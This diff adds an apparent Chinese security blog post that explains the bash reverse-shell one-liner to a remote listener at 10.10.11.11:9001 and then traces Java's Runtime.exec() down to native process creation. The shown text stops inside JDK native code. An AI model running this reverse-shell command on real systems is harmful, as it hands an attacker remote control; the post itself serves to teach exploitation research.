@@ -1,0 +1,997 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="lingx5">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="javaRveShell前言一直研究 java RCE，证明的方法总是执行 calc 在本地机器上弹出计算器，就缺乏了对于各种 RCE 漏洞利用的研究，写篇文章记录一下 java 各种反弹 shell 的操作。 linux 反弹命令解析1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.11.11&#x2F;9001 0&gt;&amp;1  &amp; 符号作用没有 &amp; 时，&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="javaRveShell详解">
+<meta property="og:url" content="http://lingx5.github.io/2025/08/03/javaRveShell%E8%AF%A6%E8%A7%A3/index.html">
+<meta property="og:site_name" content="lingx5的博客">
+<meta property="og:description" content="javaRveShell前言一直研究 java RCE，证明的方法总是执行 calc 在本地机器上弹出计算器，就缺乏了对于各种 RCE 漏洞利用的研究，写篇文章记录一下 java 各种反弹 shell 的操作。 linux 反弹命令解析1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.11.11&#x2F;9001 0&gt;&amp;1  &amp; 符号作用没有 &amp; 时，&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730092637049.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730093316430.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730093447082.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730093613968.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730094420823.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730100349241.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730100544640.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730101317718.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730101550293.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730102321264.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730103225574.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730110356425.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730110456523.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730142526350.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730145156033.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730145239345.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730145507620.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730174911904.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730174848114.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730174728842.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731101542221.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731101510436.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731110033628.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731105616577.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731105403909.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731150007446.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731150825987.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731150902166.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731151542469.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250731173825562.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803173127171.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803181216335.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803193606078.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803193641122.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803214227652.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803212640437.png">
+<meta property="og:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250803215056257.png">
+<meta property="article:published_time" content="2025-08-03T13:57:42.000Z">
+<meta property="article:modified_time" content="2025-08-03T13:58:26.472Z">
+<meta property="article:author" content="lingx5">
+<meta property="article:tag" content="java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/ling-x5/img/raw/master/image-20250730092637049.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>javaRveShell详解 - lingx5的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"lingx5.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"#"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"Q4th1PtYC02FHNKGV3QVJgNX-MdYXbMMI","app_key":"Y9vGCfdqm9u55ZBjM8ep8KDX","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2025-3-23","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>lingx5的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="javaRveShell详解"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-03 21:57" pubdate>
+          2025年8月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">javaRveShell详解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <meta name="referrer" content="no-referrer" />
+
+<h1 id="javaRveShell"><a href="#javaRveShell" class="headerlink" title="javaRveShell"></a>javaRveShell</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直研究 java RCE，证明的方法总是执行 <code>calc</code> 在本地机器上弹出计算器，就缺乏了对于各种 RCE 漏洞利用的研究，写篇文章记录一下 java 各种反弹 shell 的操作。</p>
+<h2 id="linux-反弹命令解析"><a href="#linux-反弹命令解析" class="headerlink" title="linux 反弹命令解析"></a>linux 反弹命令解析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+
+<h3 id="符号作用"><a href="#符号作用" class="headerlink" title="&amp; 符号作用"></a>&amp; 符号作用</h3><p>没有 <code>&amp;</code> 时，<code>&lt;</code> 或 <code>&gt;</code> 后面跟的是一个 <span style="font-weight:bold;">文件名</span>。<br>1&gt; out.txt : 将 stdout 输出到名为 out.txt 的文件。<br>当有 <code>&amp;</code> 时，<code>&lt;</code> 或 <code>&gt;</code> 后面跟的是一个 <span style="font-weight:bold;">文件描述符</span>。</p>
+<blockquote>
+<p><code>&gt;&amp;m</code> 的意思是“…到文件描述符 m 所指向的文件”。<br><code>&lt;&amp;m</code> 的意思是“…从文件描述符 m 所指向的文件”。</p>
+</blockquote>
+<h3 id="命令解读"><a href="#命令解读" class="headerlink" title="命令解读"></a>命令解读</h3><p>对这条命令的完整解读，他的完整版本是 </p>
+<p><code>bash -i &gt; /dev/tcp/10.10.11.11/9001 2&gt;&amp;1 0&gt;&amp;1</code></p>
+<p>linux 从左向右处理这条命令</p>
+<p><code>bash -i</code> 启动一个新的交互 shell</p>
+<p><code>&gt;</code> : 是 <code>1&gt;</code> 的简写，把标准输出重定向到 <code>/dev/tcp/10.10.11.11/9001</code> 这台伪设备，此时状态</p>
+<ul>
+<li><code>fd 1 (stdout)</code> -&gt; <code>网络连接 (TCP Socket)</code></li>
+<li><code>fd 2 (stderr)</code> -&gt; <code>屏幕</code> (尚未改变)</li>
+<li><code>fd 0 (stdin)</code> -&gt; <code>键盘</code> (尚未改变)</li>
+</ul>
+<p><code>2&gt;&amp;1</code> : 这得益于 <code>&amp;</code> 符号的作用，它把重定向的目标改为了 <code>文件描述符</code> , 实际效果就是 把错误 <code>(stderr)</code> 重定向到 <code>1</code> 文件描述符所指向的地方，在第一步 <code>&gt;</code> 中, <code>1</code> 这个标准输出描述符已经指向了 <code>/dev/tcp/10.10.11.11/9001</code> 伪设备，所以到这里的状态</p>
+<ul>
+<li><code>fd 1 (stdout)</code> -&gt; <code>网络连接 (TCP Socket)</code></li>
+<li><code>fd 2 (stderr)</code> -&gt; <code>网络连接 (TCP Socket)</code> (与 fd 1 指向同一个地方)</li>
+<li><code>fd 0 (stdin)</code> -&gt; <code>键盘</code> (尚未改变)</li>
+</ul>
+<p><code>0&gt;&amp;1</code> : 与上边讲的一样，把输入重定向到了 <code>1</code> 文件描述符所指向的位置 ， 最终状态</p>
+<ul>
+<li><code>fd 1 (stdout)</code> -&gt; <code>网络连接 (TCP Socket)</code></li>
+<li><code>fd 2 (stderr)</code> -&gt; <code>网络连接 (TCP Socket)</code> (与 fd 1 指向同一个地方)</li>
+<li><code>fd 0 (stdin)</code> -&gt;  <code>网络连接 (TCP Socket)</code> (与 fd 1 指向同一个地方)</li>
+</ul>
+<p>由此，我们就把 <code>bash -i</code> 新开起的交互 shell 的所有输入 <code>(stdin)</code> 和输出(<code>stdout</code>, <code>stderr</code>) 全部交给了 <code>tcp伪设备</code> , 也就实现了反弹 shell</p>
+<blockquote>
+<p><code>&gt;&amp;</code> <strong>合并输出重定向</strong> ：包含了 标准输出(<code>stdout</code>)和错误输出(<code>stderr</code>)</p>
+<p><code>&lt;&amp;</code> <strong>读写重定向</strong> ：包含标准输出(<code>stdout</code>) 和 标准输入(<code>stdin</code>) </p>
+</blockquote>
+<p><strong>补充知识点</strong></p>
+<p><code>0&gt;&amp;1</code> 与 <code>0&lt;&amp;1</code> 作用是完全相同的，是不是看到这个很困惑，我来解释一下</p>
+<p><code>0&gt;&amp;1</code> : 这个好理解，我们上边讲过了，将文件描述符 <code>0</code>(stdin)的输出，重定向到文件描述符 <code>1</code>(stdout)<strong>当前所指向的同一个地方</strong>，最终 <code>0</code> 和 <code>1</code> 的文件描述符指向同一文件或管道</p>
+<p><code>0&lt;&amp;1</code> : 让文件描述符 <code>0</code>(stdin) <strong>从</strong> 文件描述符 <code>1</code>(stdout)<strong>当前所指向的同一个地方</strong> 读取输入, 最终 <code>0</code> 和 <code>1</code> 的文件描述符指向同一文件或管道</p>
+<p>两者的结果是相同的</p>
+<p>我们的反弹 shell 语句的等价语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/10.10.11.11/9001 0&lt;&amp;1<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Runtime-exec"><a href="#Runtime-exec" class="headerlink" title="Runtime.exec()"></a>Runtime.exec()</h2><h3 id="windows-平台"><a href="#windows-平台" class="headerlink" title="windows 平台"></a>windows 平台</h3><p>在 Runtime 中 exec() 有 6 个重载方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730092637049.png" srcset="/img/loading.gif" lazyload alt="image-20250730092637049"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(command, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command, String[] envp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(command, envp, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String command, String[] envp, File dir)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">if</span> (command.length() == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Empty command&quot;</span>);<br><br>    <span class="hljs-type">StringTokenizer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringTokenizer</span>(command);<br>    String[] cmdarray = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[st.countTokens()];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; st.hasMoreTokens(); i++)<br>        cmdarray[i] = st.nextToken();<br>    <span class="hljs-keyword">return</span> exec(cmdarray, envp, dir);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String cmdarray[])</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(cmdarray, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] cmdarray, String[] envp)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> exec(cmdarray, envp, <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">public</span> Process <span class="hljs-title function_">exec</span><span class="hljs-params">(String[] cmdarray, String[] envp, File dir)</span><br>    <span class="hljs-keyword">throws</span> IOException &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(cmdarray)<br>        .environment(envp)<br>        .directory(dir)<br>        .start();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看的出来无论我们传入的是字符串 <code>String</code> 还是 字符数组 <code>String[]</code> 最终调用都是 <code>public Process exec(String[] cmdarray, String[] envp, File dir)</code> 方法，由他再去调用 <code>ProcessBuilder()</code> 方法</p>
+<p>我们先来简单调试一下 exec()，看他是如何运行的</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.windows;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExecTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;ipconfig /all&quot;</span>).getInputStream();<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> bytesRead;<br>        <span class="hljs-keyword">while</span> ((bytesRead = inputStream.read(bytes)) != -<span class="hljs-number">1</span>) &#123;<br>            System.out.print(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-number">0</span>, bytesRead, <span class="hljs-string">&quot;GBK&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730093316430.png" srcset="/img/loading.gif" lazyload alt="image-20250730093316430"></p>
+<p>步入，来到 java.lang.Runtime#exec(java.lang.String) </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730093447082.png" srcset="/img/loading.gif" lazyload alt="image-20250730093447082"></p>
+<p>方法重载来到 java.lang.Runtime#exec(java.lang.String, java.lang.String [], java.io.File) 方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730093613968.png" srcset="/img/loading.gif" lazyload alt="image-20250730093613968"></p>
+<p>利用 java.util.StringTokenizer 这个类处理字符串，按照 <code> \t\n\r\f</code> 进行分割 也就是（<code>空格</code> <code>\t</code> <code>\n</code> <code>\r</code> <code>\f</code>）分割</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730094420823.png" srcset="/img/loading.gif" lazyload alt="image-20250730094420823"></p>
+<p>所以 <code>ifconfig /all</code> 命令会 java.util.StringTokenizer#nextTokens 被分割为 <code>ifconfig</code> <code>/all</code> 两个 token</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">nextToken</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * If next position already computed in hasMoreElements() and</span><br><span class="hljs-comment">         * delimiters have changed between the computation and this invocation,</span><br><span class="hljs-comment">         * then use the computed value.</span><br><span class="hljs-comment">         */</span><br><br>    currentPosition = (newPosition &gt;= <span class="hljs-number">0</span> &amp;&amp; !delimsChanged) ?<br>        newPosition : skipDelimiters(currentPosition);<br><br>    <span class="hljs-comment">/* Reset these anyway */</span><br>    delimsChanged = <span class="hljs-literal">false</span>;<br>    newPosition = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (currentPosition &gt;= maxPosition)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NoSuchElementException</span>();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> currentPosition;<br>    currentPosition = scanToken(currentPosition);<br>    <span class="hljs-keyword">return</span> str.substring(start, currentPosition);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>封装为数组，并传递给 java.lang.Runtime#exec(java.lang.String [], java.lang.String [], java.io.File)</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730100349241.png" srcset="/img/loading.gif" lazyload alt="image-20250730100349241"></p>
+<p>创建 ProcessBuilder 对象，最后 start() </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730100544640.png" srcset="/img/loading.gif" lazyload alt="image-20250730100544640"></p>
+<p>在 start() 方法中，把 cmdarray [0] 赋值给了 prog</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730101317718.png" srcset="/img/loading.gif" lazyload alt="image-20250730101317718"></p>
+<p>然后调用 java.lang.ProcessImpl#start 方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730101550293.png" srcset="/img/loading.gif" lazyload alt="image-20250730101550293"></p>
+<p>在 start() 静态方法中处理了 environment 等变量，最后调用了 ProcessImpl 的构造方法</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730102321264.png" srcset="/img/loading.gif" lazyload alt="image-20250730102321264"></p>
+<p>调用 java.lang.ProcessImpl#createCommandLine 把数组变为命令字符串</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730103225574.png" srcset="/img/loading.gif" lazyload alt="image-20250730103225574"></p>
+<p>最后调用 natvie creat 创建进程，执行命令，并返回句柄</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730110356425.png" srcset="/img/loading.gif" lazyload alt="image-20250730110356425"></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250730110456523.png" srcset="/img/loading.gif" lazyload alt="image-20250730110456523"></p>
+<p>native 源码：<a target="_blank" rel="noopener" href="https://github.com/unofficial-openjdk/openjdk/blob/e59bd5b27066bb2eb77828110ee585b1598ba636/src/java.base/windows/native/libjava/ProcessImpl_md.c#L361C1-L361C34">Java_java_lang_ProcessImpl_create</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">Java_java_lang_ProcessImpl_create</span>(JNIEnv *env, jclass ignored,<br>                                  jstring cmd,<br>                                  jstring envBlock,<br>                                  jstring dir,<br>                                  jlongArray stdHandles,<br>                                  jboolean redirectErrorStream)<br>&#123;<br>    jlong ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">NULL</span> &amp;&amp; stdHandles != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">const</span> jchar *pcmd = (*env)-&gt;<span class="hljs-built_in">GetStringChars</span>(env, cmd, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">if</span> (pcmd != <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-type">const</span> jchar *penvBlock = (envBlock != <span class="hljs-literal">NULL</span>)<br>                ? (*env)-&gt;<span class="hljs-built_in">GetStringChars</span>(env, envBlock, <span class="hljs-literal">NULL</span>)<br>                : <span class="hljs-literal">NULL</span>;<br>            <span 